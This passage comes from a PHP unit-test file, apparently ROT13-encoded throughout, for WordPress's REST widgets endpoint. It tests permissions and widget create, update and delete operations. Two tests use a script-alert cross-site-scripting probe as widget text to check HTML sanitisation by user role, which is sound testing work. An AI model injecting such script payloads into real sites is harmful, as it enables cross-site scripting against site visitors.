	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_jebat_crezvffvba_nhgube( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrgf/grkg-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 53915
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba_fubj_va_erfg() {
		jc_frg_pheerag_hfre( 0 );

		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr'         => 'Grfg fvqrone',
				'fubj_va_erfg' => gehr,
			),
			neenl( 'grkg-1' )
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrgf/grkg-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrFrgf(
			neenl(
				'vq'       => 'grkg-1',
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'eraqrerq' => '<qvi pynff=\"grkgjvqtrg\">Phfgbz grkg grfg</qvi>',
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(
					'rapbqrq' => onfr64_rapbqr(
						frevnyvmr(
							neenl(
								'grkg' => 'Hcqngrq grkg grfg',
							)
						)
					),
					'unfu'    => jc_unfu(
						frevnyvmr(
							neenl(
								'grkg' => 'Hcqngrq grkg grfg',
							)
						)
					),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'grkg-2', $qngn['vq'] );
		$guvf->nffregFnzr( 'fvqrone-1', $qngn['fvqrone'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grkg'   => 'Hcqngrq grkg grfg',
				'gvgyr'  => '',
				'svygre' => snyfr,
			),
			trg_bcgvba( 'jvqtrg_grkg' )[2]
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_perngr_vgrz_znysbezrq_vafgnapr() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(
					'rapbqrq' => onfr64_rapbqr(
						frevnyvmr(
							neenl(
								'grkg' => 'Hcqngrq grkg grfg',
							)
						)
					),
					'unfu'    => 'onqunfu',
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_jvqtrg', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_perngr_vgrz_onq_vafgnapr() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_jvqtrg', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_perngr_vgrz_hfvat_enj_vafgnapr() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq_onfr'  => 'oybpx',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(
					'enj' => neenl(
						'pbagrag' => '<!-- jc:cnentencu --><c>Oybpx grfg</c><!-- /jc:cnentencu -->',
					),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'oybpx-7', $qngn['vq'] );
		$guvf->nffregFnzr( 'fvqrone-1', $qngn['fvqrone'] );
		$guvf->nffregFnzrFrgf(
			neenl(
				'pbagrag' => '<!-- jc:cnentencu --><c>Oybpx grfg</c><!-- /jc:cnentencu -->',
			),
			trg_bcgvba( 'jvqtrg_oybpx' )[7]
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_perngr_vgrz_enj_vafgnapr_abg_fhccbegrq() {
		tybony $jc_jvqtrg_snpgbel;

		$jc_jvqtrg_snpgbel->jvqtrgf['JC_Jvqtrg_Grkg']->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] = snyfr;

		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(
					'enj' => neenl(
						'gvgyr' => 'Hcqngrq grkg grfg',
					),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_jvqtrg', $erfcbafr, 400 );

		$jc_jvqtrg_snpgbel->jvqtrgf['JC_Jvqtrg_Grkg']->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] = gehr;
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_perngr_vgrz_hfvat_sbez_qngn() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq_onfr'   => 'grkg',
				'fvqrone'   => 'fvqrone-1',
				'sbez_qngn' => 'jvqtrg-grkg[2][grkg]=Hcqngrq+grkg+grfg',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'grkg-2', $qngn['vq'] );
		$guvf->nffregFnzr( 'fvqrone-1', $qngn['fvqrone'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grkg'   => 'Hcqngrq grkg grfg',
				'gvgyr'  => '',
				'svygre' => snyfr,
			),
			$qngn['vafgnapr']['enj']
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_perngr_vgrz_zhygvcyr_va_n_ebj() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(
					'enj' => neenl( 'grkg' => 'Grkg 1' ),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'grkg-2', $qngn['vq'] );
		$guvf->nffregFnzr( 'fvqrone-1', $qngn['fvqrone'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grkg'   => 'Grkg 1',
				'gvgyr'  => '',
				'svygre' => snyfr,
			),
			$qngn['vafgnapr']['enj']
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(
					'enj' => neenl( 'grkg' => 'Grkg 2' ),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'grkg-3', $qngn['vq'] );
		$guvf->nffregFnzr( 'fvqrone-1', $qngn['fvqrone'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grkg'   => 'Grkg 2',
				'gvgyr'  => '',
				'svygre' => snyfr,
			),
			$qngn['vafgnapr']['enj']
		);

		$fvqrone = erfg_qb_erdhrfg( '/jc/i2/fvqronef/fvqrone-1' );
		$guvf->nffregPbagnvaf( 'grkg-2', $fvqrone->trg_qngn()['jvqtrgf'] );
		$guvf->nffregPbagnvaf( 'grkg-3', $fvqrone->trg_qngn()['jvqtrgf'] );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_perngr_vgrz_frpbaq_vafgnapr() {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrgf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(
					'enj' => neenl(
						'grkg' => 'Hcqngrq grkg grfg',
					),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'grkg-2', $qngn['vq'] );
		$guvf->nffregFnzr( 'fvqrone-1', $qngn['fvqrone'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grkg'   => 'Hcqngrq grkg grfg',
				'gvgyr'  => '',
				'svygre' => snyfr,
			),
			$qngn['vafgnapr']['enj']
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'eff-1' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/jvqtrgf/grkg-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq'       => 'grkg-1',
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(
					'enj' => neenl(
						'grkg' => 'Hcqngrq grkg grfg',
					),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'grkg-1', $qngn['vq'] );
		$guvf->nffregFnzr( 'fvqrone-1', $qngn['fvqrone'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grkg'   => 'Hcqngrq grkg grfg',
				'gvgyr'  => '',
				'svygre' => snyfr,
			),
			$qngn['vafgnapr']['enj']
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_ernffvta_fvqrone() {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'eff-1' )
		);
		$guvf->frghc_fvqrone(
			'fvqrone-2',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl()
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/jvqtrgf/grkg-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fvqrone' => 'fvqrone-2',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$reebe    = $erfcbafr->nf_reebe();
		$guvf->nffregAbgJCReebe( $reebe, $reebe ? $reebe->trg_reebe_zrffntr() : '' );
		$guvf->nffregFnzr( 'fvqrone-2', $erfcbafr->trg_qngn()['fvqrone'] );

		$fvqrone1 = erfg_qb_erdhrfg( '/jc/i2/fvqronef/fvqrone-1' );
		$guvf->nffregAbgPbagnvaf( 'grkg-1', $fvqrone1->trg_qngn()['jvqtrgf'] );

		$fvqrone2 = erfg_qb_erdhrfg( '/jc/i2/fvqronef/fvqrone-2' );
		$guvf->nffregPbagnvaf( 'grkg-1', $fvqrone2->trg_qngn()['jvqtrgf'] );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_fubhyqag_erdhver_vq_onfr() {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'eff-1' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/jvqtrgf/grkg-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq'       => 'grkg-1',
				'vafgnapr' => neenl(
					'enj' => neenl(
						'grkg' => 'Hcqngrq grkg grfg',
					),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'grkg-1', $qngn['vq'] );
		$guvf->nffregFnzr( 'fvqrone-1', $qngn['fvqrone'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grkg'   => 'Hcqngrq grkg grfg',
				'gvgyr'  => '',
				'svygre' => snyfr,
			),
			$qngn['vafgnapr']['enj']
		);
	}

	/**
	 * @tebhc zhygvfvgr
	 */
	choyvp shapgvba grfg_fgber_ugzy_nf_nqzva() {
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregFnzr(
				'<qvi pynff=\"grkgjvqtrg\">nyreg(1)</qvi>',
				$guvf->hcqngr_grkg_jvqtrg_jvgu_enj_ugzy( '<fpevcg>nyreg(1)</fpevcg>' )
			);
		} ryfr {
			$guvf->nffregFnzr(
				'<qvi pynff=\"grkgjvqtrg\"><fpevcg>nyreg(1)</fpevcg></qvi>',
				$guvf->hcqngr_grkg_jvqtrg_jvgu_enj_ugzy( '<fpevcg>nyreg(1)</fpevcg>' )
			);
		}
	}

	/**
	 * @tebhc zhygvfvgr
	 */
	choyvp shapgvba grfg_fgber_ugzy_nf_fhcrenqzva() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregFnzr(
				'<qvi pynff=\"grkgjvqtrg\"><fpevcg>nyreg(1)</fpevcg></qvi>',
				$guvf->hcqngr_grkg_jvqtrg_jvgu_enj_ugzy( '<fpevcg>nyreg(1)</fpevcg>' )
			);
		} ryfr {
			$guvf->nffregFnzr(
				'<qvi pynff=\"grkgjvqtrg\"><fpevcg>nyreg(1)</fpevcg></qvi>',
				$guvf->hcqngr_grkg_jvqtrg_jvgu_enj_ugzy( '<fpevcg>nyreg(1)</fpevcg>' )
			);
		}
	}

	cebgrpgrq shapgvba hcqngr_grkg_jvqtrg_jvgu_enj_ugzy( $ugzy ) {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/jvqtrgf/grkg-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq'       => 'grkg-1',
				'vq_onfr'  => 'grkg',
				'vafgnapr' => neenl(
					'enj' => neenl(
						'grkg' => $ugzy,
					),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		erghea $qngn['eraqrerq'];
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_yrtnpl_jvqtrg() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grfgjvqtrg' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/jvqtrgf/grfgjvqtrg' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq'        => 'grfgjvqtrg',
				'anzr'      => 'JC grfg jvqtrg',
				'sbez_qngn' => 'grfg_vq=Zl+grfg+vq&grfg_gvgyr=Zl+grfg+gvgyr&hcqngr_grfgjvqtrg=gehr',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				'vq'            => 'grfgjvqtrg',
				'vq_onfr'       => 'grfgjvqtrg',
				'fvqrone'       => 'fvqrone-1',
				'eraqrerq'      => '<u1>Zl grfg vq</u1><fcna>Zl grfg gvgyr</fcna>',
				'eraqrerq_sbez' => 'JC grfg jvqtrg sbez',
				'vafgnapr'      => ahyy,
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_perngr_vgrz_yrtnpl_jvqtrg() {
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl()
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/jvqtrgf/grfgjvqtrg' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq'        => 'grfgjvqtrg',
				'fvqrone'   => 'fvqrone-1',
				'anzr'      => 'JC grfg jvqtrg',
				'sbez_qngn' => 'grfg_vq=Zl+grfg+vq&grfg_gvgyr=Zl+grfg+gvgyr&hcqngr_grfgjvqtrg=gehr',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				'vq'            => 'grfgjvqtrg',
				'vq_onfr'       => 'grfgjvqtrg',
				'fvqrone'       => 'fvqrone-1',
				'eraqrerq'      => '<u1>Zl grfg vq</u1><fcna>Zl grfg gvgyr</fcna>',
				'eraqrerq_sbez' => 'JC grfg jvqtrg sbez',
				'vafgnapr'      => ahyy,
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/fvqronef/fvqrone-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'jvqtrgf' => neenl(),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jebat_crezvffvba_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/fvqronef/fvqrone-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'jvqtrgf' => neenl(),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 403 );
	}

	/**
	 * Grfgf vs gur raqcbvag pbeerpgyl unaqyrf \"fynfunoyr\" punenpgref fhpu nf \" be '.
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_fynfuvat() {
		$guvf->frghc_jvqtrg( 'grkg', 1, neenl( 'grkg' => 'Phfgbz grkg grfg' ) );
		$guvf->frghc_fvqrone( 'fvqrone-1', neenl( 'anzr' => 'Grfg fvqrone' ), neenl( 'grkg-1', 'eff-1' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/jvqtrgf/grkg-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'vq'       => 'grkg-1',
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'vafgnapr' => neenl(
					'enj' => neenl(
						'grkg' => 'Hcqngrq \\\" \\\' grkg grfg',
					),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'grkg'   => 'Hcqngrq \\\" \\\' grkg grfg',
				'gvgyr'  => '',
				'svygre' => snyfr,
			),
			$qngn['vafgnapr']['enj']
		);

		$guvf->nffregFnzr(
			'<qvi pynff=\"grkgjvqtrg\">Hcqngrq \\\" \\\' grkg grfg</qvi>',
			$qngn['eraqrerq']
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'eff-1' )
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/jvqtrgf/grkg-1' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzrVtaberRBY(
			neenl(
				'vq'            => 'grkg-1',
				'vq_onfr'       => 'grkg',
				'fvqrone'       => 'jc_vanpgvir_jvqtrgf',
				'eraqrerq'      => '',
				'eraqrerq_sbez' => '<vachg vq=\"jvqtrg-grkg-1-gvgyr\" anzr=\"jvqtrg-grkg[1][gvgyr]\" pynff=\"gvgyr flap-vachg\" glcr=\"uvqqra\" inyhr=\"\">' . \"\a\" .
								'			<grkgnern vq=\"jvqtrg-grkg-1-grkg\" anzr=\"jvqtrg-grkg[1][grkg]\" pynff=\"grkg flap-vachg\" uvqqra>Phfgbz grkg grfg</grkgnern>' . \"\a\" .
								'			<vachg vq=\"jvqtrg-grkg-1-svygre\" anzr=\"jvqtrg-grkg[1][svygre]\" pynff=\"svygre flap-vachg\" glcr=\"uvqqra\" inyhr=\"ba\">' . \"\a\" .
								'			<vachg vq=\"jvqtrg-grkg-1-ivfhny\" anzr=\"jvqtrg-grkg[1][ivfhny]\" pynff=\"ivfhny flap-vachg\" glcr=\"uvqqra\" inyhr=\"ba\">',
				'vafgnapr'      => neenl(
					'rapbqrq' => onfr64_rapbqr(
						frevnyvmr(
							neenl(
								'grkg' => 'Phfgbz grkg grfg',
							)
						)
					),
					'unfu'    => jc_unfu(
						frevnyvmr(
							neenl(
								'grkg' => 'Phfgbz grkg grfg',
							)
						)
					),
					'enj'     => neenl(
						'grkg' => 'Phfgbz grkg grfg',
					),
				),
			),
			$erfcbafr->trg_qngn()
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_sbepr() {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'eff-1' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/jvqtrgf/grkg-1' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'sbepr' => gehr ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzrVtaberRBY(
			neenl(
				'qryrgrq'  => gehr,
				'cerivbhf' => neenl(

					'vq'            => 'grkg-1',
					'vq_onfr'       => 'grkg',
					'fvqrone'       => 'fvqrone-1',
					'eraqrerq'      => '<qvi pynff=\"grkgjvqtrg\">Phfgbz grkg grfg</qvi>',
					'eraqrerq_sbez' => '<vachg vq=\"jvqtrg-grkg-1-gvgyr\" anzr=\"jvqtrg-grkg[1][gvgyr]\" pynff=\"gvgyr flap-vachg\" glcr=\"uvqqra\" inyhr=\"\">' . \"\a\" .
									'			<grkgnern vq=\"jvqtrg-grkg-1-grkg\" anzr=\"jvqtrg-grkg[1][grkg]\" pynff=\"grkg flap-vachg\" uvqqra>Phfgbz grkg grfg</grkgnern>' . \"\a\" .
									'			<vachg vq=\"jvqtrg-grkg-1-svygre\" anzr=\"jvqtrg-grkg[1][svygre]\" pynff=\"svygre flap-vachg\" glcr=\"uvqqra\" inyhr=\"ba\">' . \"\a\" .
									'			<vachg vq=\"jvqtrg-grkg-1-ivfhny\" anzr=\"jvqtrg-grkg[1][ivfhny]\" pynff=\"ivfhny flap-vachg\" glcr=\"uvqqra\" inyhr=\"ba\">',
					'vafgnapr'      => neenl(
						'rapbqrq' => onfr64_rapbqr(
							frevnyvmr(
								neenl(
									'grkg' => 'Phfgbz grkg grfg',
								)
							)
						),
						'unfu'    => jc_unfu(
							frevnyvmr(
								neenl(
									'grkg' => 'Phfgbz grkg grfg',
								)
							)
						),
						'enj'     => neenl(
							'grkg' => 'Phfgbz grkg grfg',
						),
					),

				),
			),
			$erfcbafr->trg_qngn()
		);

		$erfcbafr = erfg_qb_erdhrfg( '/jc/i2/jvqtrgf/grkg-1' );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );

		$guvf->nffregNeenlAbgUnfXrl( 'grkg-1', trg_bcgvba( 'fvqronef_jvqtrgf' )['fvqrone-1'] );
		$guvf->nffregNeenlAbgUnfXrl( 1, trg_bcgvba( 'jvqtrg_grkg' ) );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_ybttrq_bhg() {
		jc_frg_pheerag_hfre( 0 );

		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'eff-1' )
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/jvqtrgf/grkg-1' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'eff-1' )
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/jvqtrgf/grkg-1' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 53557
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_zhygvcyr() {
		$guvf->frghc_jvqtrgf(
			'grkg',
			neenl(
				2 => neenl( 'grkg' => 'Grkg jvqtrg' ),
				3 => neenl( 'grkg' => 'Grkg jvqtrg' ),
				4 => neenl( 'grkg' => 'Grkg jvqtrg' ),
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-2', 'grkg-3', 'grkg-4' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/ongpu/i1' );
